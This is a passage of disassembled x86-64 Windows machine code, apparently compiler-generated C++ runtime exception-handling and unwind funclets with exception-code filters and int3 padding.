   14000d9d9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9dd:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000d9e3:	75 55                	jne    0x14000da3a
   14000d9e5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9e9:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000d9ed:	75 4b                	jne    0x14000da3a
   14000d9ef:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9f3:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000d9fa:	74 1a                	je     0x14000da16
   14000d9fc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000da00:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000da07:	74 0d                	je     0x14000da16
   14000da09:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000da0d:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000da14:	75 24                	jne    0x14000da3a
   14000da16:	e8 15 51 ff ff       	call   0x140002b30
   14000da1b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000da1f:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000da23:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000da27:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000da2b:	e8 00 51 ff ff       	call   0x140002b30
   14000da30:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000da34:	e8 e7 71 ff ff       	call   0x140004c20
   14000da39:	90                   	nop
   14000da3a:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000da41:	8b 45 20             	mov    0x20(%rbp),%eax
   14000da44:	48 83 c4 28          	add    $0x28,%rsp
   14000da48:	5d                   	pop    %rbp
   14000da49:	5b                   	pop    %rbx
   14000da4a:	c3                   	ret
   14000da4b:	cc                   	int3
   14000da4c:	40 55                	rex push %rbp
   14000da4e:	48 83 ec 20          	sub    $0x20,%rsp
   14000da52:	48 8b ea             	mov    %rdx,%rbp
   14000da55:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000da59:	8b 08                	mov    (%rax),%ecx
   14000da5b:	48 83 c4 20          	add    $0x20,%rsp
   14000da5f:	5d                   	pop    %rbp
   14000da60:	e9 d3 9b ff ff       	jmp    0x140007638
   14000da65:	cc                   	int3
   14000da66:	40 55                	rex push %rbp
   14000da68:	48 83 ec 20          	sub    $0x20,%rsp
   14000da6c:	48 8b ea             	mov    %rdx,%rbp
   14000da6f:	48 8b 01             	mov    (%rcx),%rax
   14000da72:	8b 08                	mov    (%rax),%ecx
   14000da74:	e8 7b 68 ff ff       	call   0x1400042f4
   14000da79:	90                   	nop
   14000da7a:	48 83 c4 20          	add    $0x20,%rsp
   14000da7e:	5d                   	pop    %rbp
   14000da7f:	c3                   	ret
   14000da80:	cc                   	int3
   14000da81:	40 55                	rex push %rbp
   14000da83:	48 83 ec 20          	sub    $0x20,%rsp
   14000da87:	48 8b ea             	mov    %rdx,%rbp
   14000da8a:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000da8e:	8b 08                	mov    (%rax),%ecx
   14000da90:	48 83 c4 20          	add    $0x20,%rsp
   14000da94:	5d                   	pop    %rbp
   14000da95:	e9 9e 9b ff ff       	jmp    0x140007638
   14000da9a:	cc                   	int3
   14000da9b:	40 55                	rex push %rbp
   14000da9d:	48 83 ec 20          	sub    $0x20,%rsp
   14000daa1:	48 8b ea             	mov    %rdx,%rbp
   14000daa4:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000daa9:	48 83 c4 20          	add    $0x20,%rsp
   14000daad:	5d                   	pop    %rbp
   14000daae:	e9 85 9b ff ff       	jmp    0x140007638
   14000dab3:	cc                   	int3
   14000dab4:	40 55                	rex push %rbp
   14000dab6:	48 83 ec 20          	sub    $0x20,%rsp
   14000daba:	48 8b ea             	mov    %rdx,%rbp
   14000dabd:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000dac2:	48 83 c4 20          	add    $0x20,%rsp
   14000dac6:	5d                   	pop    %rbp
   14000dac7:	e9 6c 9b ff ff       	jmp    0x140007638
   14000dacc:	cc                   	int3
   14000dacd:	40 55                	rex push %rbp
   14000dacf:	48 83 ec 20          	sub    $0x20,%rsp
   14000dad3:	48 8b ea             	mov    %rdx,%rbp
   14000dad6:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000dadb:	48 83 c4 20          	add    $0x20,%rsp
   14000dadf:	5d                   	pop    %rbp
   14000dae0:	e9 53 9b ff ff       	jmp    0x140007638
   14000dae5:	cc                   	int3
   14000dae6:	40 55                	rex push %rbp
   14000dae8:	48 83 ec 20          	sub    $0x20,%rsp
   14000daec:	48 8b ea             	mov    %rdx,%rbp
   14000daef:	33 c9                	xor    %ecx,%ecx
   14000daf1:	48 83 c4 20          	add    $0x20,%rsp
   14000daf5:	5d                   	pop    %rbp
   14000daf6:	e9 3d 9b ff ff       	jmp    0x140007638
   14000dafb:	cc                   	int3
   14000dafc:	40 55                	rex push %rbp
   14000dafe:	48 83 ec 20          	sub    $0x20,%rsp
   14000db02:	48 8b ea             	mov    %rdx,%rbp
   14000db05:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000db09:	74 0b                	je     0x14000db16
   14000db0b:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000db10:	e8 23 9b ff ff       	call   0x140007638
   14000db15:	90                   	nop
   14000db16:	48 83 c4 20          	add    $0x20,%rsp
   14000db1a:	5d                   	pop    %rbp
   14000db1b:	c3                   	ret
   14000db1c:	cc                   	int3
   14000db1d:	40 55                	rex push %rbp
   14000db1f:	48 83 ec 20          	sub    $0x20,%rsp
   14000db23:	48 8b ea             	mov    %rdx,%rbp
   14000db26:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000db2a:	48 8b 09             	mov    (%rcx),%rcx
   14000db2d:	48 83 c4 20          	add    $0x20,%rsp
   14000db31:	5d                   	pop    %rbp
   14000db32:	e9 a9 b9 ff ff       	jmp    0x1400094e0
   14000db37:	cc                   	int3
   14000db38:	40 55                	rex push %rbp
   14000db3a:	48 83 ec 20          	sub    $0x20,%rsp
   14000db3e:	48 8b ea             	mov    %rdx,%rbp
   14000db41:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000db48:	8b 08                	mov    (%rax),%ecx
   14000db4a:	48 83 c4 20          	add    $0x20,%rsp
   14000db4e:	5d                   	pop    %rbp
   14000db4f:	e9 e4 9a ff ff       	jmp    0x140007638
   14000db54:	cc                   	int3
   14000db55:	40 55                	rex push %rbp
   14000db57:	48 83 ec 20          	sub    $0x20,%rsp
   14000db5b:	48 8b ea             	mov    %rdx,%rbp
   14000db5e:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000db62:	8b 08                	mov    (%rax),%ecx
   14000db64:	48 83 c4 20          	add    $0x20,%rsp
   14000db68:	5d                   	pop    %rbp
   14000db69:	e9 ea 9c ff ff       	jmp    0x140007858
   14000db6e:	cc                   	int3
   14000db6f:	40 55                	rex push %rbp
   14000db71:	48 83 ec 20          	sub    $0x20,%rsp
   14000db75:	48 8b ea             	mov    %rdx,%rbp
   14000db78:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000db7b:	48 83 c4 20          	add    $0x20,%rsp
   14000db7f:	5d                   	pop    %rbp
   14000db80:	e9 d3 9c ff ff       	jmp    0x140007858
   14000db85:	cc                   	int3
   14000db86:	40 55                	rex push %rbp
   14000db88:	48 83 ec 20          	sub    $0x20,%rsp
   14000db8c:	48 8b ea             	mov    %rdx,%rbp
   14000db8f:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000db94:	48 83 c4 20          	add    $0x20,%rsp
   14000db98:	5d                   	pop    %rbp
   14000db99:	e9 9a 9a ff ff       	jmp    0x140007638
   14000db9e:	cc                   	int3
   14000db9f:	40 55                	rex push %rbp
   14000dba1:	48 83 ec 20          	sub    $0x20,%rsp
   14000dba5:	48 8b ea             	mov    %rdx,%rbp
   14000dba8:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000dbac:	48 83 c4 20          	add    $0x20,%rsp
   14000dbb0:	5d                   	pop    %rbp
   14000dbb1:	e9 2a b9 ff ff       	jmp    0x1400094e0
   14000dbb6:	cc                   	int3
   14000dbb7:	40 55                	rex push %rbp
   14000dbb9:	48 83 ec 20          	sub    $0x20,%rsp
   14000dbbd:	48 8b ea             	mov    %rdx,%rbp
   14000dbc0:	48 8b 01             	mov    (%rcx),%rax
   14000dbc3:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000dbc9:	74 0c                	je     0x14000dbd7
   14000dbcb:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000dbd1:	74 04                	je     0x14000dbd7
   14000dbd3:	33 c0                	xor    %eax,%eax
   14000dbd5:	eb 05                	jmp    0x14000dbdc
   14000dbd7:	b8 01 00 00 00       	mov    $0x1,%eax
   14000dbdc:	48 83 c4 20          	add    $0x20,%rsp
   14000dbe0:	5d                   	pop    %rbp
   14000dbe1:	c3                   	ret
   14000dbe2:	cc                   	int3
   14000dbe3:	cc                   	int3
   14000dbe4:	cc                   	int3
   14000dbe5:	cc                   	int3
   14000dbe6:	cc                   	int3
   14000dbe7:	cc                   	int3
   14000dbe8:	cc                   	int3
   14000dbe9:	cc                   	int3
   14000dbea:	cc                   	int3
   14000dbeb:	cc                   	int3
   14000dbec:	cc                   	int3
   14000dbed:	cc                   	int3
   14000dbee:	cc                   	int3
   14000dbef:	cc                   	int3
   14000dbf0:	40 55                	rex push %rbp
   14000dbf2:	48 83 ec 20          	sub    $0x20,%rsp
   14000dbf6:	48 8b ea             	mov    %rdx,%rbp
   14000dbf9:	48 8b 01             	mov    (%rcx),%rax
   14000dbfc:	33 c9                	xor    %ecx,%ecx
   14000dbfe:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000dc04:	0f 94 c1             	sete   %cl
   14000dc07:	8b c1                	mov    %ecx,%eax
   14000dc09:	48 83 c4 20          	add    $0x20,%rsp
   14000dc0d:	5d                   	pop    %rbp
   14000dc0e:	c3                   	ret
   14000dc0f:	cc                   	int3
